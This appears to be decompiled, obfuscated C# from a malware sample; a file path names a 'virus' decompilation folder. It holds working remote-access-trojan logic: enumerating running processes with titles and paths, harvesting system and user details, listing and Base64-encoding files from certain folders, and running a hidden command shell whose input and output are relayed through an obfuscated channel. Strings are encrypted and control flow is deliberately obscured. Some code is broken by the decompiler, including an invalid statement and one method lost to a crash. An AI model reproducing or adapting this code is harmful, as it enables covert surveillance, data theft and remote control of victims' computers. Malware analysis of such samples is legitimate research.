using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

[StandardModule]
internal sealed class ___________________
{
	private static Process _;

	private static bool __;

	static ___________________()
	{
		___________________.__ = false;
	}

	public static void _()
	{
		string mainWindowTitle;
		string[] processName = null;
		string fileName;
		int id = 0;
		int length;
		try
		{
			string str = <Module>.____<string>(1157226556);
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < checked((int)processes.Length); i++)
			{
				Process process = processes[i];
				try
				{
					string processName1 = process.ProcessName;
					try
					{
						mainWindowTitle = process.MainWindowTitle;
						if (Operators.CompareString(mainWindowTitle, string.Empty, false) == 0)
						{
							mainWindowTitle = <Module>.______<string>(555695132);
						}
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						mainWindowTitle = <Module>.___<string>(-1940130832);
						ProjectData.ClearProjectError();
					}
					try
					{
						fileName = process.Modules[0].FileName;
						if (Operators.CompareString(fileName, string.Empty, false) == 0)
						{
							fileName = <Module>._______<string>(640289527);
						}
					}
					catch (Exception exception1)
					{
						ProjectData.SetProjectError(exception1);
						fileName = <Module>._______<string>(640289527);
						ProjectData.ClearProjectError();
					}
					try
					{
					}
					catch (Exception exception2)
					{
						ProjectData.SetProjectError(exception2);
						ProjectData.ClearProjectError();
					}
					if ((1963 ^ -(id * 86 + id * 42)) != 0)
					{
						processName = new string[] { str, null, null, null, null, null, null, null, null };
						int num = Type.EmptyTypes.Length + -30017;
						int _________ = <Module>._________________;
						if ((-597377024 & _________ * 1024) == (628 * _________ + _________ * 396 & -597377024))
						{
							length = Type.EmptyTypes.Length + 0;
						}
						else
						{
							length = ((4764 & id) + 732 == 1817089838 ? Type.EmptyTypes.Length + 2147288645 : Type.EmptyTypes.Length + 1142915169);
						}
						switch (length)
						{
							default:
							{
								processName[1] = process.ProcessName;
								processName[2] = <Module>.___<string>(1971668521);
								int num1 = num;
								num = 8028;
								if (num1 == -30017)
								{
									id = process.Id;
									processName[3] = id.ToString();
									num == 8225;
									break;
								}
								else
								{
									break;
								}
							}
						}
					}
					processName[4] = <Module>.______<string>(-1779299201);
					processName[5] = mainWindowTitle;
					processName[6] = <Module>.______<string>(-1779299201);
					processName[7] = fileName;
					processName[8] = <Module>.____<string>(-1286171096);
					str = string.Concat(processName);
				}
				catch (Exception exception3)
				{
					ProjectData.SetProjectError(exception3);
					ProjectData.ClearProjectError();
				}
			}
			______________________________________________________________.____________(str);
		}
		catch (Exception exception4)
		{
			ProjectData.SetProjectError(exception4);
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		try
		{
			string str = <Module>._____<string>(471224930);
			string str1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(string.Concat(str, _________________________________________________________________._______()), str), _____________________________________________________________________._________()), str), _________________________________________________________________.______________()), str), _________________________________________________________________.__________________()), str), _________________________________________________________________.___________________()), str), _________________________________________________________________.____________________()), str), Environment.UserName), str), _________________________________________________________________.________________()), str), _________________________________________________________________._________________()), str), _________________________________________________________________._______________()), str), _________________________________________________________________._____________()), str), _________________________________________________________________.____________()), str), _________________________________________________________________.__________()), str), _________________________________________________________________.___________()), str), _____________________________________________________________________________.__), str));
			______________________________________________________________._____________(string.Concat(<Module>.____<string>(1779488812), ___________________________________________________________________.____(str1)));
			Thread thread = new Thread(new ThreadStart(___________________.___));
			__________________________________.____________ = 1648825765;
			thread.Start();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___()
	{
		// 
		// Current member / type: System.Void ___________________::___()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void ___()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void ____(string string_0)
	{
		int j = 0;
		int num = 0;
		int ______ = 0;
		int length;
		string str = null;
		int i;
		string[] name = null;
		int ______1 = 0;
		int num1 = 0;
		int length1;
		int length2;
		int num2;
		try
		{
			if ((<Module>.________________ * -2046820352 - 6655 ^ 2946) != 0)
			{
				goto Label0;
			}
			length1 = (int)(sizeof(short) + -2145285158);
		Label4:
			str = <Module>.__________(length1, (int)(sizeof(Guid) + 64410), Type.EmptyTypes.Length + 144);
			if (-(j * 671 + 353 * j) != 6402)
			{
				______ = <Module>.___________;
				if ((______ >> 2) * -1308622848 == -5848)
				{
					length2 = (int)(sizeof(short) + -1329811296);
				}
				else if ((~(______ * 633 + 1415 * ______) / 62 ^ 134222753) == 0)
				{
					length2 = (~(((______ << 22) + -3922) * 16384) == ______ / 256 ? Type.EmptyTypes.Length + 2006367534 : Type.EmptyTypes.Length + 1987608199);
				}
				else
				{
					length2 = Type.EmptyTypes.Length + -1458;
				}
			}
			else
			{
				length2 = Type.EmptyTypes.Length + 1291163002;
			}
			if (length2 == -1458)
			{
				goto Label1;
			}
			else
			{
				goto Label2;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		______1 = <Module>.___________;
		if (((9170 + ______1 * 408289280 | -11138) == -2050 ? Type.EmptyTypes.Length + -30126 : Type.EmptyTypes.Length + 2111291183) != -30126)
		{
			goto Label1;
		}
	Label2:
		length1 = Type.EmptyTypes.Length + 63475;
		goto Label4;
	Label1:
		if (Directory.Exists(______________________.___))
		{
			string str1 = <Module>.____<string>(-663908840);
			DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
			FileInfo[] files = directoryInfo.GetFiles(<Module>.______<string>(-1473362416));
			for (i = 0; i < checked((int)files.Length); i++)
			{
				FileInfo fileInfo = files[i];
				try
				{
					if ((4 & -5896 + (7796 | ______)) != 4)
					{
						num2 = Type.EmptyTypes.Length + 2145027821;
					}
					else
					{
						int ______2 = <Module>.___________;
						if (-(32768 * ______2) + ((______2 << 13) - 1056) == 5279)
						{
							num2 = 1757704027;
						}
						else if (16384 * ((33549024 & ______2) - 9047) - -588709888 == (______2 ^ ______2))
						{
							num2 = Type.EmptyTypes.Length + -883082793;
						}
						else if ((32 & ______ + 1037206976 << 5) != (32 & 104160 * ______))
						{
							num2 = 1706380069;
						}
						else
						{
							num2 = (______2 * 102 + 1946 * ______2 != 2851 ? 17168 : -1668808652);
						}
					}
					if (17169 != num2)
					{
						do
						{
							name = new string[] { str1, null, null, null, null, null, null };
							length = Type.EmptyTypes.Length + 5728;
							switch (Type.EmptyTypes.Length)
							{
								case 0:
								{
									name[1] = fileInfo.Name;
									name[2] = <Module>.___<string>(-1617572493);
									continue;
								}
								default:
								{
									goto case 0;
								}
							}
						}
						while (length == 28019);
					}
					name[3] = ____________________.____________(fileInfo.Length).ToString();
					name[4] = <Module>.______<string>(861631917);
					name[5] = fileInfo.FullName;
					name[6] = <Module>.____<string>(-201016429);
					str1 = string.Concat(name);
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					ProjectData.ClearProjectError();
				}
			}
			str = string.Concat(str, str1, <Module>.______<string>(514244381));
			if ((i * 67108864 - -7504 >> 26) - 79024 == i)
			{
			}
		Label6:
			while (Operators.CompareString(str, <Module>.___<string>(-346849456), false) == 0)
			{
				int length3 = Type.EmptyTypes.Length + 2;
				while (true)
				{
					switch (length3)
					{
						case 0:
						{
							break;
						}
						case 2:
						{
							str = <Module>.__________(Type.EmptyTypes.Length + 36613, Type.EmptyTypes.Length + 37547, Type.EmptyTypes.Length + 254);
							length3 = Type.EmptyTypes.Length + 0;
							continue;
						}
						default:
						{
							goto Label6;
						}
					}
				}
			}
		}
		if (Directory.Exists(______________________._____))
		{
			string str2 = <Module>.___<string>(-1758302020);
			DirectoryInfo directoryInfo1 = new DirectoryInfo(______________________._____);
			FileInfo[] fileInfoArray = directoryInfo1.GetFiles(<Module>._______<string>(-986854915));
			for (j = 0; j < checked((int)fileInfoArray.Length); j++)
			{
				FileInfo fileInfo1 = fileInfoArray[j];
				try
				{
					if (~(______1 / 304 / 1073741824) != 0 * ______1)
					{
						goto Label7;
					}
				Label9:
					name[1] = fileInfo1.Name;
					name[2] = <Module>.____<string>(-1286171096);
					if (num == -20883)
					{
						name[3] = ____________________.____________(fileInfo1.Length).ToString();
						name[4] = <Module>.____<string>(-1286171096);
						name[5] = fileInfo1.FullName;
						name[6] = <Module>.____<string>(-201016429);
						str2 = string.Concat(name);
						goto Label8;
					}
				Label7:
					while (true)
					{
						name = new string[] { str2, null, null, null, null, null, null };
						num = -20883;
						if (num1 - 1610612736 != num1)
						{
							goto Label9;
						}
					}
				}
				catch (Exception exception2)
				{
					ProjectData.SetProjectError(exception2);
					ProjectData.ClearProjectError();
				}
			Label8:
			}
			__________________________________________________________________________.___ = 1952428595;
			str = string.Concat(str, str2, <Module>.___<string>(-1758302020));
			if (str.Contains(<Module>.___<string>(-730017399)))
			{
				str = str.Replace(<Module>._______<string>(292283964), string.Empty);
			}
		}
		str = string.Concat(str, <Module>.____<string>(261875982), _____________________________________________________________________.___(string_0), <Module>.______<string>(-1487179333));
		______________________________________________________________._____________(string.Concat(<Module>._______<string>(-1827813410), ___________________________________________________________________.____(str)));
	}

	public static string _____()
	{
		string str;
		try
		{
			if (Directory.Exists(______________________.___))
			{
				string empty = string.Empty;
				DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
				FileInfo[] files = directoryInfo.GetFiles(<Module>.____<string>(-1126801251));
				for (int i = 0; i < checked((int)files.Length); i++)
				{
					FileInfo fileInfo = files[i];
					try
					{
						empty = string.Concat(empty, fileInfo.Name, <Module>._______<string>(1023697363));
					}
					catch (Exception exception)
					{
						ProjectData.SetProjectError(exception);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(empty, string.Empty, false) != 0)
				{
					str = empty;
					return str;
				}
			}
			str = <Module>.______<string>(-2140503654);
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			Exception exception1 = exception2;
			______________________________________________________________.______________(<Module>.____<string>(1187660804), string.Concat(<Module>._____<string>(-1913446199), exception1.ToString()));
			str = <Module>._____<string>(1296256311);
			ProjectData.ClearProjectError();
		}
		return str;
	}

	public static string ______(string string_0)
	{
		string base64String;
		try
		{
			if (!File.Exists(string.Concat(______________________.___, string_0)))
			{
				base64String = Convert.ToBase64String(Encoding.Unicode.GetBytes(<Module>.____<string>(1073122417)));
			}
			else
			{
				string str = File.ReadAllText(string.Concat(______________________.___, string_0));
				base64String = Convert.ToBase64String(Encoding.Unicode.GetBytes(str));
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.___<string>(1387161447), string.Concat(<Module>.____<string>(-922599948), exception.ToString()));
			base64String = Convert.ToBase64String(Encoding.Unicode.GetBytes(<Module>.___<string>(157537695)));
			ProjectData.ClearProjectError();
		}
		return base64String;
	}

	public static void _______()
	{
		try
		{
			if (!___________________._________())
			{
				(new Thread(new ThreadStart(___________________.________))).Start();
			}
			else
			{
				______________________________________________________________.____________(<Module>.______<string>(530025909));
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		ProcessStartInfo processStartInfo;
		int num = 0;
		try
		{
			while (true)
			{
				processStartInfo = new ProcessStartInfo(<Module>._____<string>(1931166709))
				{
					WorkingDirectory = <Module>._______<string>(1629533668)
				};
				if ((2976 ^ num) - 71614464 != (num / 8192 + 3036) * 8192)
				{
					break;
				}
			}
			processStartInfo.Arguments = <Module>.______<string>(182638373);
			processStartInfo.CreateNoWindow = true;
			switch (sizeof(long))
			{
				case 9:
				{
					processStartInfo.RedirectStandardError = true;
					___________________._ = Process.Start(processStartInfo);
					___________________.__ = true;
					(new Thread(new ThreadStart(___________________.____________))).Start();
					___________________.___________(<Module>.____<string>(1854754518));
					______________________________________________________________.____________(<Module>.______<string>(488575158));
					break;
				}
				default:
				{
					processStartInfo.UseShellExecute = false;
					processStartInfo.RedirectStandardInput = true;
					processStartInfo.RedirectStandardOutput = true;
					goto case 9;
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			______________________________________________________________.____________(<Module>.______<string>(-1818785341));
			ProjectData.ClearProjectError();
		}
	}

	public static bool _________()
	{
		bool flag;
		try
		{
			if (___________________._ != null)
			{
				flag = (!___________________._.HasExited ? true : false);
			}
			else
			{
				flag = false;
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			flag = false;
			ProjectData.ClearProjectError();
		}
		return flag;
	}

	public static void __________()
	{
		try
		{
			if (___________________._ != null)
			{
				if (!___________________._.HasExited)
				{
					______________________________________________________________.____________(<Module>.______<string>(-1832602258));
					___________________.__ = false;
					___________________._.Kill();
				}
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________(string string_0)
	{
		try
		{
			___________________._.StandardInput.WriteLine(string_0);
			___________________._.StandardInput.WriteLine();
			___________________._.StandardInput.Flush();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________()
	{
		unsafe
		{
			int ______ = 0;
			string str = null;
			string str1 = null;
			StringBuilder stringBuilder = null;
			object length;
			int num;
			try
			{
				bool flag = false;
				___________________._.StandardInput.WriteLine(<Module>.___<string>(-2039761074));
				___________________._.StandardInput.Flush();
				___________________._.StandardOutput.ReadLine();
				length = Type.EmptyTypes.Length + 3;
				while (true)
				{
				Label6:
					switch (length)
					{
						case 0:
						{
							Thread.CurrentThread.Abort();
							goto Label0;
						}
						case 1:
						{
							string str2 = str1;
							int ________ = <Module>._______________;
							if ((15 & ~(________ * 120 + 8 * ________)) != 15)
							{
								if (________ * 454 + ________ * 58 - -469762048 != (________ ^ 4289) << 9)
								{
									num = (int)(sizeof(short) + -1662734877);
								}
								else
								{
									num = ((1420 * ________ + 5286 + 628 * ________ >> 11) + 7921 == ________ ? -1895141614 : Type.EmptyTypes.Length + -1692412010);
								}
							}
							else if ((________ * 264 + ________ * 1784 >> 5 >> 6 & 1) != (1 & -________))
							{
								num = Type.EmptyTypes.Length + 1538822975;
							}
							else if (-553648128 + (165 ^ ________) != ________)
							{
								int ________1 = <Module>._______________;
								int ______1 = <Module>.__________;
								if (________1 * 1046723648 - 3578 - 266528 == (8 * ______1 + 8 * ______1) * 4)
								{
									num = Type.EmptyTypes.Length + 1146000540;
								}
								else
								{
									______ = <Module>.___________;
									num = (-(609664 * ______) == 6337 ? checked((int)-1635659423) : Type.EmptyTypes.Length + 91);
								}
							}
							else
							{
								num = Type.EmptyTypes.Length + -961780388;
							}
							if (Operators.CompareString(str2, <Module>.__________(11627, 12600, num), false) == 0)
							{
								break;
							}
							______________________________________________________________.____________(string.Concat(<Module>._______<string>(440569610), str1.TrimEnd(new char[0]), <Module>._____<string>(917869336)));
							break;
						}
						case 2:
						{
							if (!string.IsNullOrEmpty(str))
							{
								if (!flag)
								{
									bool flag1 = str.Contains(<Module>.______<string>(-206199914));
									flag = flag1;
									if (flag1)
									{
										goto Label3;
									}
									if (139 * (______ / 8) + 117 * (______ / 8) - -134217728 == 32 * ______)
									{
										goto case 1;
									}
								}
								stringBuilder.AppendLine(str);
								goto case 4;
							}
						Label3:
							stringBuilder.AppendLine();
							str1 = stringBuilder.ToString();
							length = sizeof(long) + -7;
							continue;
						}
						case 3:
						{
							___________________._.StandardOutput.ReadLine();
							break;
						}
						case 4:
						{
							str = ___________________._.StandardOutput.ReadLine();
							length = sizeof(ulong) + -6;
							continue;
						}
						default:
						{
							goto case 3;
						}
					}
					if (!___________________.__)
					{
						break;
					}
					if (___________________.__ && ___________________._.HasExited)
					{
						goto Label5;
					}
				Label0:
					stringBuilder = new StringBuilder();
					___________________._.StandardOutput.ReadLine();
					length = Type.EmptyTypes.Length + 4;
				}
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				ProjectData.ClearProjectError();
			}
			return;
		Label5:
			______________________________________________________________.____________(<Module>.___<string>(-1334034792));
			Thread.Sleep(500);
			length = sizeof(ushort) + -2;
			goto Label6;
		}
	}
}